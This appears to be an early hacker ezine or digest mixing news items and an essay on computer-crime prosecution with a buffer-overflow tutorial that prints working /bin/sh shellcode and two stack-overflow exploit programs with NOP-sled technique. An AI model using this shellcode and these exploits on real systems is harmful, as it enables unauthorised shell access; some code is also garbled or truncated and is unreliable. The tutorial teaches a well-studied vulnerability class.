          will detonate our nuclear bombs and your President Clinton and his 
          interns will die. 

          One more thing, there is too much free speech on the internet, we want 
          you to try to do something about it. Thanks. 

     This CWC message was described by the Secret Service and reported by MSNBC 
     as a death threat to the president. 

     I respect the fact that law enforcement needs to treat death threats 
     seriously. I also respect the fact that security personnel -- in law 
     enforcement as in computer security -- are paid to be paranoid. But I do 
     think that calling Coolio's text "a death threat to the President" is 
     stretching it a bit. Dare I suggest that the D.A.R.E. site's damage 
     estimates are also exaggerated? 

     I wonder how they would estimate damages and determine the motivation for 
     an incident in which somebody's domicile was toilet-papered? After all, the 
     act involves trespassing, doesn't it? It sounds like a pretty serious 
     breach of security to me, and it could happen to anyone. After all, the 
     streets are totally unregulated. Perhaps scariest of all is the fact that 
     if it happened to me, I would never, ever be able to trace the perpetrator 
     who originated the attack back to his house. Somebody declare a state of 
     emergency, quick! 

     Is your refrigerator running? If instead of defacing its Website, Coolio 
     had made prank phone calls to D.A.R.E., would those calls count as 
     unauthorized access to systems? Would the Feds be calling for the power to 
     install phone taps on all of the nation's phones to catch him? Would they 
     spend thousands of dollars in taxpayer money to crisscross the entire 
     country in search of him and then threaten him with 5 to 15 years in jail? 
     Would he have been portrayed as a guilty-until-proven-innocent hoodlum in 
     the media? 

     Not all "computer crimes" are equivalent to one another. Merely poking 
     around a system is different from defacing a Website -- which is different 
     from stealing passwords, which is different from stealing credit card 
     numbers, which is different from actually using those credit card numbers. 

     If you don't know what I mean by that, then G. William Troxler's essay 
     about different types of hacking (see Resources) might be a good starting 
     point towards understanding some different motivations for "unauthorized 
     access to systems." 

     I guess law enforcement is asking for such tough sanctions against kids 
     (felony vandalism, indeed) in the attempt to "scare them straight" and 
     teach them to "respect the law." It's OK to try to do that. But it is not 
     OK to do that with inhumane and inappropriate punishments that do not fit 
     the crime. 

     That area of law is dangerously broken. If you don't believe me, go read 
     Robert W.F. Clark's account of being arrested for computer crime ("My Bust 
     or An Odyssey of Ignorance"), the story of Bernie S, and Brian Martin's 
     essays (see Resources). I'm sure that Coolio didn't think that he would be 
     caught. I'm equally sure that prosecutors won't be interested in his 
     motivation or in investigating what he really did. 

     How soon will it be before young Americans -- of both sexes, this time -- 
     begin to run away from the United States to seek sanctuary in Canada again? 
     I guess we should be glad that at least one North American country appears 
     to be relatively sane. But I wish that the one I live in right now was, 
     too. 

     The real world I am not trying to say that everyone who has breached 
     security is a kid. Nor am I saying that everyone who has breached security 
     is harmless. A great deal of harm can be done -- and probably is being 
     done, even as you read this -- by people of real malice, perhaps people 
     such as the PhoneMasters (see Resources). 

     Criminals should be caught, and they should be punished. But those who 
     violate privacy, embezzle money, and steal credit card numbers don't go 
     around drawing attention to themselves by defacing Webpages. Besides, we 
     already have other laws which can be used to punish people who embezzle 
     money or commit credit card fraud. 

     But I think that Coolio should be punished, too. Being grounded (without 
     the use of his computer) for two weeks might be adequate. Taking the cough 
     syrup into account, let's make it a month. 

     With Janet Reno's report, law enforcement is asking for more money to fight 
     the looming specter of cybercrime. I'd love to know exactly how much money 
     has been spent to track down this kid from New Hampshire. If law 
     enforcement continues to dispense money willy-nilly to track adolescent 
     pranksters, they will never have enough time, money, or personnel -- no 
     matter how many times we increase their budget -- to recognize and go after 
     the real criminals -- like the ones that the government predicts will only 
     make their presence known once they are prepared to strike. Yeah, like, I 
     remember the last time that happened, when Dr No hijacked those nuclear 
     warheads off the coast of Cape Canaveral. It was really terrifying to have 
     the whole world held hostage by a supercriminal like that. Perhaps Ms Reno 
     et all need to spend a bit more time on the Internet, and a bit less time 
     watching reruns on TV.

     Computer hacker, 19, held on charges of burglary and car theft 

     A computer hacker charged with breaking into White House, Army and Senate 
     computers is being held in Harris County Jail on unrelated charges of 
     burglary and car theft. 

     Patrick W. Gregory, 19, who lives in east Harris County, had been scheduled 
     to appear in federal court Wednesday to plead guilty to damaging computers 
     and trafficking in unauthorized personal identification numbers. His 
     Tuesday arrest prevented that. 

     "What we have him for is fairly unspectacular," said sheriff's Capt. Don 
     McWilliams. "These are not related to his prior federal cases. What we have 
     him for is not related to that at all." 

     He was arrested after the sheriff's Burglary Response Squad found enough 
     evidence to charge him with burglary and unauthorized use of a vehicle. No 
     details on that case were available. 

     Only after arresting him did sheriff's investigators discover that Gregory 
     was due to appear in federal court on the hacking charge. 

     "What happens now with his federal situation, I couldn't say," McWilliams 
     said. 

     During his days as a high-profile, high-tech bandit, Gregory called himself 
     "MostHateD" and headed a computer gang dubbed "globalHell," according to a 
     plea agreement he signed earlier this month. 

     The hacker group drew attention last May when it succeeded in getting into 
     the White House Web site. That gang also is accused of vandalizing Army and 
     Senate computers. 

     Prosecutors accuse the group of illegally accessing teleconference services 
     from AT&T, MCI and Sprint. Gregory was one of four Houston-area teens 
     arrested. 

     Gregory told the Houston Chronicle last June that globalHell numbered as 
     many as 20 people, including a handful of international members, primarily 
     in Europe. Most were youngsters trying to make a name for themselves 
     through Web-hacking, he said. 

     Gregory's hard drive, seized by government agents who raided his house, 
     revealed he was adept at ducking in and out of varied databases, including 
     the state of West Virginia's main Web page, the Philippines Bureau of 
     Internal Revenue, the British Computer Society, the American Retirement 
     Corp. and the government of Burundi.

      Disney and Miramax Sued for 'Hacking'; Parts of 'The Fugitive Game' 
      Allegedly Stolen For New Movie


      Story Filed: Wednesday, March 29, 2000 8:18 AM EST 

      SAN FRANCISCO, Mar 29, 2000 (BUSINESS WIRE) -- The Walt Disney Company and 
      its Miramax division have made a computer hacker movie that "hacked" the 
      author's book without paying or giving credit to the writer, according to 
      a lawsuit filed yesterday by       Bartko, Zankel, Tarrant & Miller, a law 
      firm representing best-selling author Jonathan Littman. 

      Littman's suit alleges that the Disney/Miramax/Dimension Films production 
      of the movie Takedown, which premiered earlier this month in 29 theatres 
      in Paris, France, was based in large part on lifted segments of Littman's 
      book, The Fugitive Game. Littman's book,       published in 1996, is based 
      on the celebrated capture of computer hacker Kevin Mitnick, who was billed 
      at the time as the world's most notorious and dangerous "cyberterrorist." 

      "Jonathan Littman carefully researched the reality of the computer hacker 
      underworld," said his lawyer Bill Edlund. "His book articulated and 
      supported his view that Kevin Mitnick was not the premeditated, greedy and 
      destructive criminal portrayed by some of the       media. Readers and 
      critics received Littman's The Fugitive Game as a more in-depth 
      presentation and entertaining expose of the flawed Mitnick prosecution 
      than the overblown, self-interested media hype." 

      The Fugitive Game shows Mitnick to be not a terrorist, but a computer 
      hacker, in part a misguided victim of a government entrapment effort that 
      used a sleazy informant to lure Mitnick into hacking. A key element of 
      Littman's book is his examination of the media       hype spurred in New 
      York Times articles by reporter John Markoff about the Mitnick story. 

      Littman also questions Markoff's presentation of Tsutomu Shimomura, a 
      computer security specialist who used hacking techniques similar to 
      Mitnick's to trace Mitnick to his hideout in North Carolina. 

      Shimomura and Markoff wrote their version of these events in their book 
      Takedown, released at the same time as Littman's book. The book is based 
      on the seven-week pursuit of Mitnick by Shimomura that led to Mitnick's 
      arrest in February of 1995. The Disney       organization purchased the 
      book and movie rights to Takedown and have now released their movie 
      version, hiring a cast that included lead actor Skeet Ulrich and 
      screenwriters led by John Danza. 

      "The screenwriter could not shape the story told in the book Takedown into 
      a workable script," said Edlund. "Once the movie project began to 
      flounder, Danza and other screenwriters lifted most of the first part of 
      Littman's The Fugitive Game for the storyline and       start of the movie 
      Takedown. Littman's lawsuit is backed by e-mails allegedly sent by Danza. 
      In the e-mails, the screenwriter admits that it was 'unfortunate' that 
      Disney did not option the rights to the book The Fugitive Game to make the 
      movie Takedown. Danza goes on to describe his desire to use Littman's 
      insider information and parts of Littman's book in order to try and 
      salvage the movie project." 

      The complaint presents a detailed comparison between Littman's book and 
      the final shooting script for the movie Takedown, allegedly illustrating 
      repeated and compelling similarities between the two. According to the 
      allegations, the film Takedown and The Fugitive       Game both open with 
      a scene in a strip club frequented by a government informer who reveals to 
      Mitnick information about "SAS" -- a secret Pacific Bell phone-tapping 
      system that Mitnick subsequently breaks into and uses. 

      Littman's lawsuit also contends that various themes and interpretations 
      from his book that are absent from the book Takedown appear in the movie 
      version of Takedown, including the government informer and entrapment of 
      Mitnick, and the pressure on the       government to capture Mitnick 
      created by exaggerated media hype. 

      Littman seeks to prevent Disney, Miramax and the other defendants from 
      continuing to violate his copyrights by distributing the movie and to 
      recover his damages and the wrongful profits that defendants obtained from 
      the alleged theft of his work. Littman's lawyers       say that the 
      Disney-Miramax plagiarism tainted Littman's work by patching it into their 
      motion picture. 

      Because of this, he is also asking for damages that he claims resulted 
      from opportunities he lost, including the opportunity for involvement with 
      other movie projects based on The Fugitive Game.

      Videogame Makers Sue Yahoo Over Piracy

      Elinor Abreu

      (Industry Standard)

      Videogame makers Sega, Nintendo and Electronic Arts have filed a lawsuit 
      against Yahoo, accusing the portal of ignoring sales of counterfeit 
      videogames on its auction and mall areas.

      The lawsuit, which the manufacturers filed yesterday in U.S. District 
      Court in San Francisco, accuses Yahoo of copyright and trademark 
      infringement, unfair competition, and offering illegal devices for sale. 
      The lawsuit asks the court to order Yahoo to stop the       sales. It also 
      seeks compensatory damages of up to $100,000 per copyright violation, and 
      up to $2,500 for each sale of the hardware devices - some of which are 
      called "Mod Chips" - that allow people to circumvent copyright protection, 
      says Jeff Brown, a spokesman for Redwood City, Calif.-based Electronic 
      Arts. 

      Yahoo spokeswoman Diane Hunt offers little comment on the lawsuit. "We're 
      not aware of specific situations," she says.

      The gamemakers claim people are selling the illegal items in Yahoo's 
      auction area, and in the shopping area that Yahoo leases to outside 
      merchants. "They are openly sold and labeled" with phrases like 'back up 
      copy,' 'compilation disk' and 'never published,'       according to Brown. 
      "It's very widespread and blatant."

      Electronic Arts sent two letters about the matter to Yahoo's general 
      counsel last summer. It followed the letters with phone calls, Brown says 
      - all of which were ignored. At an industry meeting with Yahoo 
      representatives in December 1999, the company seemed       unconcerned, he 
      adds. 

      "Yahoo's position was that they either didn't care or didn't feel the need 
      to address the problem," Brown says. "That is essentially what's forced us 
      to find a legal solution."

      Electronic Arts says the problem crops up on other Web sites, but that the 
      owners of those sites are either in discussions with Electronic Arts or 
      have taken steps to resolve the problem.

      The company doesn't know the extent of its losses to online piracy, but it 
      notes that a study by the Interactive Digital Software Association pegged 
      worldwide losses from Net piracy and counterfeiting at $3.2 billion. The 
      issue of piracy looms large for makers of       computer software. That's 
      particularly true overseas, where enforcement can be lax and prices high. 
      Within the U.S., makers of music CDs are battling with companies that 
      offer ways to distribute digital music online. 

      Representatives from Nintendo and Sega, the top two gamemakers in the U.S. 
      after Electronic Arts, were not immediately available for comment.

      Rome, Mar 01, 2000 (EFE via COMTEX) -- Brazilian hackers broke into the 
      computer system at Como's Insubria University in northern Italy, police 
      said Wednesday, after university officials reported the incident. 

      The break-in affected 130 computers used by professors, researchers, 
      students and administrative personnel in the Department of Physical 
      Sciences and Mathematics. 

      Technicians have isolated the site from the rest of the university's data

      Brazilian virus. 

      Italian technicians said the hackers were able to break the security code 
      and gain access to the network, and used several computers to take control 
      of the e-mail system. 

      Even though an early check of the network revealed that damages to the 
      system are not substantial, departmental activity has been at a total 
      standstill for more than three days. EFE

      E-Commerce Companies Quarreling on Hacker Issues

      
      Story Filed: Monday, March 27, 2000 8:26 PM EST 

      BEIJING (March 28) XINHUA - Several Beijing-based Electronic commerce 
      companies are quarreling with each other on hacker issues recently. 

      Sources with www.dangdang.com claim that its online bookstore has been 
      hacked repeatedly this month. The sources said it believed that the 
      hacker's Internet Protocol (IP) address was from another online shopping 
      website, www 8848.net. An online discount store,       www.123.com, also 
      said that hacker from 8848 had invaded its website, said today's China 
      Daily. 

      Dangdang, who said the hacking had caused "serious economic losses, "has 
      reported the case to Beijing's Dongcheng District Public Security 
      Sub-bureau and has employed an attorney for possible investigation. 

      However, the 8848 company denied the accusation and its CEO, Wang Juntao, 
      confirmed that no person from his company had been involved in the 
      behavior. 

      Wang said that technically an IP address is very easy to imitate. He also 
      indicated that some online shopping companies may hype the hacker issue. 

      The 8848 net is the biggest domestic online shopping site and Dangdang 
      claims it is the leading domestic online bookstore. 

      Wang said that dot com companies should adopt more responsible attitudes 
      on hacker issues, and should pay more attention to strengthening their 
      network security than accusing competitors. 

      The Dongcheng District police authority is cautious about the case. But an 
      official said that there are still no reports on their investigation. 

      A poll from a local company showed that more than half of its interviewees 
      who have not shopped on-line said they will not try this kind of shopping 
      in the next three months.

       Hackers Hold Convention in Israel

       By LAURIE COPANS, Associated Press Writer 

       JERUSALEM (AP) - Hackers from around the world overcame interrogations, 
       censorship and an all-around bad image to hold Israel's first hacker 
       convention, wrapping up the two-day conference Thursday without a glitch.

       The 350-strong gathering was the first of its kind since the Yahoo! and 
       e-Bay commercial sites were crippled in February, reminding companies 
       across the globe of the dangers hackers can pose.

       At the request of lawmakers, Israeli police had considered banning the 
       conference, but Attorney General Eliyakim Rubinstein gave the go-ahead.

                               One of the original hackers, John Draper of 
                               Fremont, Calif., said the hackers wanted to put a 
                               better face on the practice.

                               ``A hacker is a person who is developing programs 
                               to make them better,'' Draper told The Associated 
                               Press. ``They aren't the kind of people who break 
                               into computer systems. That's a cracker.''

                               Draper, known by the handle ``Captain Crunch,'' 
                               helped launch the hacker phenomenon. In 1971, he 
                               discovered that a toy whistle from a cereal box 
                               reproduced the tone needed to open a free 
                               telephone line.

                               Aware of his fame, Israeli security agents at the 
                               Los Angeles airport interrogated Draper for an 
                               hour, he said, and thoroughly searched his 
                               computer equipment before allowing him on the 
                               plane.

       ``There were many attempts to silence us on this,'' organizers said in a 
       summary of the gathering, released on their Web site.

       Police prevented the organizers from publishing one of the results of the 
       conference: a list of vulnerable Israeli commercial Web sites.

       To compile the list, participants played ``HackTheseSites'' with sites 
       offered up by Israeli companies. The site owners were confident no one 
       could thwart them, but they were wrong.

       When they weren't eating pizza or guzzling soda, the hackers sat bent 
       over their computer screens. They discovered that 28 percent of the 
       Israeli net is vulnerable - about the same proportion as the rest of the 
       world, according to organizers.

       Police were invited to attend the conference and even to speak, but they 
       turned down the offer, creating the game ``Spot the Fed.''

       Participants were given the challenge of finding plainclothes policemen 
       among them. If a person pointed out as suspicious was in fact a security 
       official, the official was to get an ``I am the FED'' T-shirt, and the 
       spotter an ``I spotted the FED'' shirt. But none were        found out.

       Israeli lawmaker and former Science Minister Michael Eitan accepted an 
       invitation to attend. He said that hacker games like those displayed at 
       the conference were meant more to entertain ambitious youngsters than 
       cause harm.

       ``I told them that as long as they all enjoy the freedom of the Internet 
       and don't abuse this freedom, and make the public support police 
       intervention, this will work,'' Eitan said in a telephone interview.

       Participants also got to speak to their guru - convicted cyberbandit 
       Kevin Mitnick - in a conference call. The 36-year-old American bemoaned 
       the strict probation terms that ban him from using a computer or any 
       hi-tech device.

       Mitnick was released last year after serving five years in jail for 
       breaking into the computer systems of some of America's biggest 
       companies, including Motorola Inc. (NYSE:MOT - news), Novell Inc. 
       (NasdaqNM:NOVL - news) and Sun Microsystems Inc.        (NasdaqNM:SUNW - 
       news)

       ``He had a lot of sympathy in the room - we all know not being able to 
       touch a computer is a worse punishment than even being in jail,'' said 
       Neora Shaul, a Tel Aviv computer programmer who helped coordinate the 
       conference.

      Legal DVD for Penguin-Heads by Michelle Finley 

      3:00 a.m. Mar. 31, 2000 PST       "Woo-hoo! No more double-boot disks!" 
      yelled Linux user Joe CapoBianco, in reaction to InterVideo's announcement 
      that it will soon release a software DVD player/decoder for the Linux 
      operating system. 

      Although there is some support for DVD on Linux, some of the open source 
      operating systems users set up their machines to run both Linux and 
      Windows in order to watch DVD movies and play games. 

      The lack of DVD support for Linux has come to the forefront lately, 
      pushing some developers to come up with solutions that included an 
      unauthorized DVD decoder for Linux, which resulted in lawsuits filed by 
      the DVD industry. 

      InterVideo has a long-standing Content Scrambling System (CSS) license, 
      enabling it to produce and market DVD player/decoder software without 
      violating copyright or other laws. 

      InterVideo sales and marketing head Joe Monastiero says the Linux platform 
      presents a variety of opportunities for the company to expand its existing 
      technology base, including DVD software. 

      "Of notable interest is the set-top environment; however, even the PC 
      space has enough interest in Linux to make our development worthwhile," he 
      said. "Additionally, as should be obvious based on the reports generated 
      by Wired       News a few months ago regarding DVD and Linux, the reason 
      why the CSS hack was done for the Linux community is because traditional 
      Windows multimedia developers writing Linux code are not exactly 
      plentiful." 

      The product, dubbed LinDVD, will allow users to play back DVD movies, 
      interactive DVD titles, MPEG video content, and Video CDs on PCs that are 
      equipped with a DVD drive without the need for a hardware decoder card. 
      The       decoder/player includes integrated MPEG1 and MPEG2 file 
      playback, a powerful VCD 2.0 player, and SVCD playback. A full 
      multi-channel Dolby Digital (TM) audio decoder will be included. 

      LinDVD will be available late spring and will be priced at $29.95. If 
      "someone writes a multichannel audio driver for their Linux sound card," 
      Monastiero said, "the multichannel version would be $49.95 and would 
      support full 5.1 output." 

      In keeping with the spirit of open source ethics, Monastiero says that 
      InterVideo is looking at ways to open up as much of the product as 
      possible to the OS community. 

      "Certainly, there will be an [application programming interface] published 
      to create unique user experiences and [user interfaces]," he said. "We are 
      also looking at ways to help developers port drivers to our code. 

      "But the CSS, Dolby, and navigation code will definitely not be open 
      source. We're doing this to add a legal player to the market that the DVD 
      industry can also be happy with." 

      "This is another exciting day for the Linux community," said Linus 
      Torvalds, creator of the Linux operating system. "[Linux] continues to 
      attract industry-leading software companies like InterVideo. Their digital 
      video and audio products       will greatly enhance the Linux multimedia 
      experience."

      water purifying tablets and camping gear. He had tried to enter the

      Japanese tourist survives Y2K test hiccup 14:40 Thursday 30 March 2000 AAP 
      STAFF at a remote outback roadhouse in Western Australia revealed today 
      how a Japanese tourist turned up on their doorstep equipped with a flak 
      jacket and gas mask, fearing the Y2K bug would trigger a nuclear 
      explosion. 

      The terrified tourist had travelled to Australia, believing the world 
      would be plunged into chaos as it entered the new millennium. 

      Customs officials revealed yesterday how they stopped the man at 
      immigration carrying a survival kit, a blow gun and a chemical warfare 
      outfit. 

      And in the latest development in the incredible saga, outback residents 
      told today how the man feared Armageddon had arrived, when a routine 
      generator check on New Year's Eve caused a blackout. 

      Lisa Williams, who works at the Willare Bridge roadhouse 2334km north of 
      Perth, said the man "freaked out'' when the generators cut out at about 
      10pm on 31 December, resulting in a four-minute power blackout. 

      "He was running around going 'Y2K, Y2K', he was really panic-stricken,'' 
      Williams said.

      She said the man's English was poor and nobody was able to make him 
      understand what was happening. 

      It was not until roadhouse manager Graeme McNamara telephoned a Japanese 
      interpreter in Broome, who then spoke to the terrified tourist, that he 
      calmed down. 

      "She explained to him that no bombs were going to be falling and that 
      there wasn't going to be a nuclear holocaust, it was just the generators 
      being changed,'' Williams said.

      He told them he believed the millennium bug would trigger a nuclear 
      explosion and he planned to head for the outback because he thought it 
      would be the safest place to be. 

      When he arrived in Australia, his flak jacket and the blow gun and darts, 
      illegal in Australia, were confiscated by customs officials, it emerged 
      yesterday. 

      But the man was allowed to enter the country with the other items, which 
      included an SAS basic remote survival book, a gas mask, dehydrated food, 
      an army style water container, water purifying tablets and camping gear. 

      Williams said she had tried to show the man the roadhouse's computer 
      console was still working after the power was restored to reassure him 
      that the millennium bug had not eventuated. 

      "I was pointing to the computer and trying to explain to him but he was 
      still in a state about it until he spoke to the interpreter,'' she said. 

      Roadhouse co-manager Sheree Marich said the man, dressed in army-style 
      camouflage gear, had arrived at the roadhouse earlier that afternoon by 
      taxi from Broome, a 165km trip for which he paid about $300.

      "I didn't understand why the taxi driver had dropped him off to us at 
      first,'' Marich said.

      "I actually thought he was a bit of a callous bastard who'd taken his 
      money and dumped him in the middle of nowhere.'' 

      She said it was only later that she learned that the man had researched 
      the area and had asked to be taken there because of its remoteness. 

      The man left Australia, content that the world had not come to an end, 
      after enjoying a restful holiday.

     COREZINE - faq
     ~~~~~~~~~~~~~~~~~
      
      
     FAQ: 

     Q: Why did i start corezine?
     A: Mainly because i want to help spread the knowledge. I like to get into new things, but sometimes there's just no info about it anywhere. Then you'll have to look at the source (read: linux kernel), but this is
     way over the heads of some people. Nobody likes to look in that big piece of code, so they'll just say "nah, nevermind. I'll go do something else". Basicly i want to save people from all this trouble. If you need
     help, mail me. Don't waste time in lame channels on IRC packed with people who don't want to help or can't help (#coders, #linux).

      --------[ info
      
      This is the first release of our brand new ezine. Since it's the first
      one, it's not really fantastic. We put it together in a week. 
      But next time (i prommis) i'll be huge and fantastic. By then i hope to have 
      finished my "ulimate backdoor", which i will release then. 
      Psionic is working on a new and bigger tutor on installing linux. 
      Everyone should have linux or BSD. We hope to get a lot of readermail and
      other responses. You can mail us at .
      If you want to encrypt your mail, i've added a PGP-key at the bottom of
      this text. 
      REMEMBER: Big Brother is watching.
      
      BTW: i've added extract.c to easily extract the programs included in this
           ezine. I didn't make it myself, you could say i ripped from phrack.
           But it's not, i just have a lot of stuff to do.
           The program uses the <++> and <--> tags, they aren't part of the
           texts or programs.

      -----------------------[ BUFFEROVERFLOWS
          by Lamagra  buffer/example.c
      void main()
      {
              char big_string[100];
              char small_string[50];
      
              memset(big_string,0x41,100);
              /* strcpy(char *to,char *from) */
              strcpy(small_string,big_string);
      }
      <--> end of example.c
      
      The program creates two strings, memset() files the big_strings with 
      char 0x41 (= A). Then it copies the big_string into the small_string.
      As we all see the small_string can't hold 100 chars and a bufferoverflow 
      follows.
      
      Let's take a look at the memory:
      
      [    big_string     ] [ small_string ] [SFP] [RET] 
      
      During the bufferoverflow the SFP (Stack Frame Pointer) and the RET will 
      be overwritten by A's. This means that the RET will now be 0x41414141
      (0x41 is the hex value of A). When the function returns, the IP will be 
      replaced by the overwritten RET. Then the computer will try to execute 
      the instruction at 0x41414141. This will result in a segmentation violation
      because this address is outside the process space.
      
      
      --------------------[ Exploitation
      
      Now that we know we can change the flow of the program by overwriting the RET,
      we can try to exploit it. Instead of overwriting with A's, we could 
      overwrite it with a specific address.
      
      ------------[ Execution of arbitrary code
      
      Now we need something to point the address to and execute. In most cases 
      we'll just spawn a shell, although this is not the only thing we can do.
      
      Before:
      
              FFFFF BBBBBBBBBBBBBBBBBBBBB EEEE RRRR FFFFFFFFFF
      
              B = the buffer
              E = stack frame pointer
              R = return address
              F = other data
      
      After:
              FFFFF SSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF
      
              S = shellcode
              A = address pointing to the shellcode
              F = other data
      
      
      The code to spawn a shell in C looks like this:
      
      <++> buffer/shell.c
      void main(){
        char *name[2];
      
        name[0] = "/bin/sh";
        name[1] = 0x0;
        execve(name[0], name, 0x0);
        exit(0);
      }
      <--> end of shellcode
      
      I'm not going to explain how to produce shellcode because this will require a 
      lot of knowledge in ASM. It's a long and boring process that we don't need to 
      get into because there is more than enough shellcode available.
      
      For those who want to learn how to make it:
              - compile the program above using the -static flag
              - open it up in gdb, use the "disassemble main" command
              - take all the unnecessary code
              - change and rewrite it, this time in ASM
              - compile, open it up in gdb and use the "disassemble main" command
              - use the x/bx command on the addresses of the instructions 
                and retrieve the hex-code.
      
                                     XXXXXXXXXXX
                                     X WAKE UP X
                                     XXXXXXXXXXX
      
      Or you can just take this code
      char shellcode[]=
              "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
              "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
              "\x80\xe8\xdc\xff\xff\xff/bin/sh";
      
      ------------[ Finding the address
      
      When we try to overflow a buffer of an another program, the problem is finding 
      the address of the buffer. The answer to this problem is that for every program 
      the stack starts at the same address. Therefore by knowing where the stack 
      starts we can try to guess the address of the buffer.
      
      This program will give us its stack pointer:
      
      <++> buffer/getsp.c
      unsigned long get_sp(void){
        __asm__("movl %esp, %eax);
      }
      void main(){
         fprintf(stdout,"0x%x\n",get_sp());
      }
      <--> end of getsp.c
      
      ------------[ Trying to exploit an example
      
      We're going to try to exploit this program:
      
      <++> buffer/hole.c
      void main(int argc,char **argv[]){
        char buffer[512];
      
        if (argc > 1) /* otherwise we crash our little program */
           strcpy(buffer,argv[1]);
      }
      <--> end of hole.c
      
      <++> buffer/exploit1.c
      #include 
      
      #define DEFAULT_OFFSET                    0
      #define DEFAULT_BUFFER_SIZE             512
      
      char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
      
      unsigned long get_sp(void) {
         __asm__("movl %esp,%eax");
      }
      
      void main(int argc, char *argv[]) 
      {
        char *buff, *ptr;
        long *addr_ptr, addr;
        int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
        int i;
      
        if (argc > 1) bsize  = atoi(argv[1]);
        if (argc > 2) offset = atoi(argv[2]);
      
        if (!(buff = malloc(bsize))) {
               printf("Can't allocate memory.\n");
               exit(0);
        }
      
        addr = get_sp() - offset;
        printf("Using address: 0x%x\n", addr);
      
        ptr = buff;
        addr_ptr = (long *) ptr;
        for (i = 0; i < bsize; i+=4)
             *(addr_ptr++) = addr;
      
        ptr += 4;
      
        for (i = 0; i < strlen(shellcode); i++)
                *(ptr++) = shellcode[i];
      
        buff[bsize - 1] = '\0';
      
        memcpy(buff,"BUF=",4);
        putenv(buff);
        system("/bin/bash");
      }
      <--> end of exploit1.c
      
      
      Now we can try to guess the offset (bufferaddress = stackpointer + offset).
      
      [bubbles]$ exploit1 600
      Using address: 0xbffff6c3
      [bubbles]$ ./hole $BUF
      [bubbles]$ exploit1 600 100
      Using address: 0xbffffce6
      [bubbles]$ ./hole $BUF
      segmentation fault
      etc.
      
      etc.
      
      As you see this process is nearly impossible, we have to guess the exact address 
      of the buffer. To increase our chances, we can pad NOP's before the shellcode 
      in our overflow buffer. The NOP instruction is used to delay execution.
      We use it because then we don't need the guess the exact address of the buffer. 
      If the overwritten return address points inside the NOPstring. Our code will be 
      executed seconds later.
      
      The memory should look like this:
              FFFFF NNNNNNNNNNNSSSSSSSSSSSSSSAAAAAAAAFFFFFFFFF
      
              N = NOP
              S = shellcode
              A = address pointing to the shellcode
              F = other data
      
      We rewrite our old exploit.

       char shellcode[] =
         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"

         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
      
      unsigned long get_sp(void) {
         __asm__("movl %esp,%eax");
      }
      
      void main(int argc, char *argv[]) 
      {
        char *buff, *ptr;
        long *addr_ptr, addr;
        int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
        int i;
      
        if (argc > 1) bsize  = atoi(argv[1]);
        if (argc > 2) offset = atoi(argv[2]);
      
        if (!(buff = malloc(bsize))) {
              printf("Can't allocate memory.\n");
              exit(0);
        }
      
        addr = get_sp() - offset;
        printf("Using address: 0x%x\n", addr);
      
        ptr = buff;
        addr_ptr = (long *) ptr;
        for (i = 0; i < bsize; i+=4)
               *(addr_ptr++) = addr;
      
        for (i = 0; i < bsize/2; i++)
               buff[i] = NOP;
      
        ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
        for (i = 0; i < strlen(shellcode); i++)
               *(ptr++) = shellcode[i];
      
        buff[bsize - 1] = '\0';
      
        memcpy(buff,"BUF=",4);
        putenv(buff);
        system("/bin/bash");
      }
      <--> end of exploit2.c
      
      [bubbles]$ exploit2 600
      Using address: 0xbffff6c3
      [bubbles]$ ./hole $BUF
      segmentation fault
      [bubbles]$ exploit2 600 100
      Using address: 0xbffffce6
      [bubbles]$ ./hole $BUF
      #exit
      [bubbles]$
      
      To improve our exploit even more, we could place the shellcode inside an 
      environment variable. Then we could overflow the buffer with the address of this 
      variable. This method will increase our chances even more.
      
      We modify our code so it uses the setenv() call to put the shellcode in the environment.

      --------------------[ Finding bufferoverflows
      
      There is really only one way to find bufferoverflows, and that is by reading the 
      source. Since Linux is an open-source system, it will be easy to obtain the source 
      of the programs. Long live open-source.
      
      Look for library functions that don't preform boundary checking like:
              strcpy(), strcat(), sprintf(), vsprintf(), scanf().
      Other dangerous ones are:
              getc() and getchar() put in a while loop.
              misuse of strncat.

      So, you want to connect to other computers from within your own programs
      you say? You can't find any info on the net to teach you how to do so? You
      have no idea what man pages to look up? You can't find/afford any books?
      Well, you came to the right place. In this paper I hope to give a jump
      start into programming your own Internet applications in C. This paper
      does assume at least *some* familiarity with C and it's syntax, and also
      that you are using some form of UNIX or Linux (from now on referred to as
      *nix), although large parts of programming sockets in *nix is the same as
      in Windows, there are some differences which I won't get into (because I don't
      program in windows ;)). It should also be noted that all code contained 
      in this paper was written and compiled on a Red Hat 5.2 system using
      glibc 2.0.7 and libc 5.3.12 and it all compiled fine. Now, lets get on
      with the show shall we.
      
      To a programmer, sockets are very similar to a low level file descriptor
      (you can even use the read() and write() functions with your sockets)
      although creating the socket itself is more involved than opening, reading
      and writing to files due to the additional complexity of creating network
      connection compared to reading and writing from your own hard drive.
      
      For most socket use, you will need a client, server pair. The server job
      is to listen on a specified port and perform some action when it receives
      a request from the client, while the clients job (obviously) is to "ask"
      the server to perform whatever task(s) it was programmed to do.
      
      We won't be using *every* socket type function in this paper since it is a
      beginner's tutorial, but there will be enough information to get you up and
      running and (hopefully) having some fun. With that said, let's make some
      sockets.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Creating a socket with: socket()
      
      The first thing you need to do to write your socket program is (of course)
      create a socket, using the socket() function:
      -------
      
      #include 
      #include 
      
      int socket(int af, int type, int protocol)
      
      ------
      'int af' is the address family or domain the socket is part of. The two
      most common are:
              AF_UNIX - Used for interprocess communication on a single machine.
              AF_INET - Used for interprocess communication on the same, or
